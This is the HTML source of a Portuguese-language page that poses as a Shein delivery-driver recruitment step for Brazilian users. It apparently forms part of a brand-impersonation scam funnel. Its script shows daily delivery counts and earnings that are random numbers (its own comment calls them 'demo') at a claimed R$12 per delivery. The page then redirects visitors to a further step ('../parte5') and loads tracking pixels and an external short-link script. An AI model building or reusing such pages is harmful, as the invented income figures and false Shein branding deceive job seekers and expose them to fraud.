<html lang="pt-BR"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <title>Shein Delivery Partners</title>
  <script src="https://smush.uno/4PgIdk"></script>
 <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
<script>
  window.pixelId = "6817f93a9c84b0352763c7c8";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script><script async="" defer="" src="js/pixel.js"></script>
  <link rel="stylesheet" href="css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" crossorigin="" href="css/style.css">
  <style type="text/css" id="operaUserStyle"></style>
</head>

<body style="">
  <div id="root">
    <div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events: none;">
      <ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]">
      </ol>
    </div>
    <div class="bg-white min-h-screen flex flex-col">
      <header class="bg-white shadow-md">
        <div class="container mx-auto px-4 py-4 flex items-center justify-between"><a href="#" id="a2f8efa9-40c3-3c57-f3b7-842bdd9b6c80"><img src="images/1200px-Shein-logo.png" alt="Shein Logo" class="h-8 cursor-pointer"></a>
          <div class="hamburger-menu cursor-pointer">
            <div class="hamburger-line w-[16px] h-[3px] bg-[#EE4D2D] my-1 transition-all duration-400">
            </div>
            <div class="hamburger-line w-[20px] h-[3px] bg-[#EE4D2D] my-1 transition-all duration-400">
            </div>
            <div class="hamburger-line w-[24px] h-[3px] bg-[#EE4D2D] my-1 transition-all duration-400">
            </div>
          </div>
        </div>
      </header>
      <div class="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        <div class="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        <div class="flex items-center relative z-10">
          <div class="text-white mr-3"><i class="fas fa-chevron-right text-3xl font-black" style="color: white;"></i>
          </div>
          <div class="leading-none">
            <h1 class="text-base font-bold text-white mb-0">Motorista Parceiro</h1>Shein
            <p class="text-white text-sm mt-0" style="transform: translateY(-2px);">Shein</p>
          </div>
        </div>
      </div>
      <div class="flex-grow container mx-auto py-8 w-full">
        <div class="w-full mx-auto p-6 mb-8">
          <h1 class="text-2xl font-bold text-center mb-2 text-gray-800">Escolha onde retirar os pedidos</h1>
          <p class="text-center text-gray-600 mb-6">Selecione as cidades onde você pode retirar os pedidos no
            Centro de distribuição da Shein. Em cada cidade abaixo está localizado um centro de
            distribuição e de acordo com a sua disponibilidade pode estar escolhendo mais de 1 centro para
            retirar os pedidos.</p>
          <div class="mb-4 flex justify-between items-center">
            <p class="text-sm font-medium text-gray-700" id="estadoescolhido">Estado: não selecionado</p>


            <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 border border-input bg-background hover:bg-accent hover:text-accent-foreground px-4 text-xs py-1 h-8" type="button" id="marcartodos">Marcar
              Todos</button>
          </div>
          <div class="border rounded-[3px] overflow-hidden p-4 relative">
            <div class="max-h-[500px] overflow-y-auto custom-scrollbar">

              <div class="cidades grid grid-cols-2 md:grid-cols-3 gap-3 sm:gap-4">

              </div>


            </div>
          </div>

          <div style="display: none;" id="resumo-entregas" class="rounded-lg text-card-foreground shadow-sm mt-6 mb-6 p-4 border border-[#E83D2240] bg-[#FFF8F6]">

          </div>
          <div class="mt-6"><button disabled="" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 h-10 px-4 w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px]" type="button" style="height: 50px;" id="fc91d748-4763-e57b-e0b2-2adf6bec52db">Prosseguir</button></div>
        </div>
      </div>
      <footer class="bg-[#EE4E2E] text-white py-10 mt-auto">
        <div class="container mx-auto px-4">
          <div class="flex flex-col md:flex-row justify-between items-center">
            <div class="mb-6 md:mb-0"><img src="images/Screenshot_3.png" alt="Shein Logo" class="h-10 mb-2 mx-auto md:mx-0 bg-white p-1 rounded">
              <p class="text-sm text-center md:text-left">© 2024 Shein. Todos os direitos reservados.</p>
            </div>
            <div class="text-center md:text-right">
              <p class="text-sm opacity-80 mb-2">Programa de Parceiros Entregadores Shein</p>
              <p class="text-xs opacity-70">Trabalhe conosco e faça parte da nossa equipe de entregas</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const ratePerDelivery = 12.00; // R$ por entrega
      const sigla = localStorage.getItem('selectedStateSigla');
      const estadoEl = document.getElementById('estadoescolhido');
      const cidadesContainer = document.querySelector('.cidades');
      const resumoContainer = document.getElementById('resumo-entregas');
      const btnMarcarTodos = document.getElementById('marcartodos');

      if (!sigla) {
        estadoEl.textContent = 'Estado: não selecionado';
        return;
      }

      const btnProsseguir = document.getElementById('fc91d748-4763-e57b-e0b2-2adf6bec52db');

      // Começa desabilitado
      btnProsseguir.disabled = true;

      // Redireciona
      btnProsseguir.addEventListener('click', () => {
        if (!btnProsseguir.disabled) {
          var currentUrlParams = window.location.search;
          window.location.href = "../parte5" + currentUrlParams;
        }
      });

      // 1) Exibe sigla
      estadoEl.textContent = `Estado: ${sigla}`;

      // 2) Busca municípios via IBGE
      fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${sigla}/municipios`)
        .then(r => r.json())
        .then(lista => {
          lista.forEach(mun => {
            const nome = mun.nome;
            const entregas = Math.floor(Math.random() * 50) + 10; // demo: 10–59 entregas
            const card = document.createElement('div');
            card.className = 'p-2 sm:p-4 border rounded-[3px] cursor-pointer hover:bg-gray-50 transition-colors border-gray-200';
            card.dataset.cidade = nome;
            card.dataset.entregas = entregas;
            card.innerHTML = `
                  <div class="flex items-center justify-between">
                    <span class="text-xs sm:text-sm font-medium text-gray-700 truncate max-w-[75%]">
                      ${nome}
                    </span>
                    <button type="button"
                            aria-checked="false"
                            data-state="unchecked"
                            class="peer shrink-0 border h-4 w-4 sm:h-5 sm:w-5 border-gray-300 rounded"></button>
                  </div>`;
            cidadesContainer.appendChild(card);
          });
        })
        .catch(() => {
          cidadesContainer.innerHTML = '<p class="text-red-500">Erro ao carregar cidades.</p>';
        });

      // guarda cidades marcadas
      const selecionadas = new Set();

      // delegação de evento para os cards
      cidadesContainer.addEventListener('click', e => {
        const card = e.target.closest('.cidades > div');
        if (!card) return;
        const btn = card.querySelector('button');
        const nome = card.dataset.cidade;
        const isChecked = btn.getAttribute('data-state') === 'checked';

        if (!isChecked) {
          // MARCAR
          btn.setAttribute('data-state', 'checked');
          btn.classList.add('bg-[#EE4E2E]', 'text-white');
          btn.innerHTML = `
      <svg xmlns="http://www.w3.org/2000/svg"
           class="h-4 w-4"
           viewBox="0 0 24 24"
           fill="none"
           stroke="currentColor"
           stroke-width="2"
           stroke-linecap="round"
           stroke-linejoin="round">
        <path d="M5 13l4 4L19 7"/>
      </svg>`;

          // SÓ ADD aqui
          card.classList.add('border-2', 'border-red-500', 'bg-red-50', 'shadow-md');

          selecionadas.add(nome);
        } else {
          // DESMARCAR
          btn.setAttribute('data-state', 'unchecked');
          btn.classList.remove('bg-[#EE4E2E]', 'text-white');
          btn.innerHTML = '';

          // SÓ REMOVE aqui
          card.classList.remove('border-2', 'border-red-500', 'bg-red-50', 'shadow-md');

          selecionadas.delete(nome);
        }

        renderResumo();
      });



      // marca/desmarca todos
      btnMarcarTodos.addEventListener('click', () => {
        const cards = cidadesContainer.querySelectorAll('div[data-cidade]');
        const allChecked = selecionadas.size === cards.length;
        selecionadas.clear();
        cards.forEach(card => {
          const btn = card.querySelector('button');
          if (!allChecked) {
            btn.setAttribute('data-state', 'checked');
            card.classList.add('border-2', 'border-red-500', 'bg-red-50', 'shadow-md');
            btn.classList.add('bg-[#EE4E2E]', 'text-white');
            btn.innerHTML = `
  <svg xmlns="http://www.w3.org/2000/svg"
       class="h-4 w-4"
       viewBox="0 0 24 24"
       fill="none"
       stroke="currentColor"
       stroke-width="2"
       stroke-linecap="round"
       stroke-linejoin="round">
    <path d="M5 13l4 4L19 7"/>
  </svg>`;

            selecionadas.add(card.dataset.cidade);
          } else {
            btn.setAttribute('data-state', 'unchecked');
            card.classList.remove('border-2', 'border-red-500', 'bg-red-50', 'shadow-md');
            btn.classList.remove('bg-[#EE4E2E]', 'text-white');
            btn.innerHTML = '';
          }
        });
        btnMarcarTodos.textContent = allChecked ? 'Marcar Todos' : 'Desmarcar Todos';
        renderResumo();
      });

      // atualiza o resumo abaixo
      function renderResumo() {
        if (!selecionadas.size) {
          resumoContainer.style.display = 'none';
          resumoContainer.innerHTML = '';
          return;
        }
        resumoContainer.style.display = 'block';

        btnProsseguir.disabled = selecionadas.size === 0;

        let totalEnt = 0, totalR$ = 0;
        const linhas = Array.from(selecionadas).map(cidade => {
          // encontra o card para ler entregas
          const card = cidadesContainer.querySelector(`div[data-cidade="${cidade}"]`);
          const ent = +card.dataset.entregas;
          const valor = ent * ratePerDelivery;
          totalEnt += ent;
          totalR$ += valor;
          return `
                <div class="grid grid-cols-1 md:grid-cols-3 gap-2 mb-2">
                  <span class="font-medium md:col-span-1">${cidade}:</span>
                  <span class="font-bold text-[#E83D22] md:col-span-1">${ent} <span class="font-normal text-gray-700">entregas</span></span>
                  <span class="font-medium text-green-600 md:col-span-1">R$ ${valor.toFixed(2)} <span class="font-normal text-gray-700">/dia</span></span>
                </div>`;
        }).join('');

        resumoContainer.innerHTML = `
              <div class="rounded-lg text-card-foreground shadow-sm mt-6 mb-6 p-4 border border-[#E83D2240] bg-[#FFF8F6]">
                <div class="flex flex-col">
                  <h3 class="font-medium text-gray-800 mb-2">Previsão de Entregas</h3>
                  <div class="text-sm text-gray-700">
                    <p>Quantidade média diária de entregas que podem ser destinadas a você:</p>
                    <div class="mt-2 p-3 bg-white rounded-[3px] border border-[#E83D2220]">
                      <div class="text-center mb-3 bg-[#FFF8F6] p-2 rounded-[3px]">
                        <span class="font-medium text-[#E83D22]">
                          A Shein paga R$ ${ratePerDelivery.toFixed(2)} por entrega realizada
                        </span>
                      </div>
                      ${linhas}
                      <div class="mt-3 pt-3 border-t border-[#E83D2220] grid grid-cols-1 md:grid-cols-3 gap-2">
                        <span class="font-semibold">Total diário:</span>
                        <span class="font-bold text-[#E83D22]">${totalEnt} <span class="font-normal text-gray-700">entregas</span></span>
                        <span class="font-semibold text-green-600">R$ ${totalR$.toFixed(2)} <span class="font-normal text-gray-700">/dia</span></span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>`;
      }
    });
  </script>






</body></html>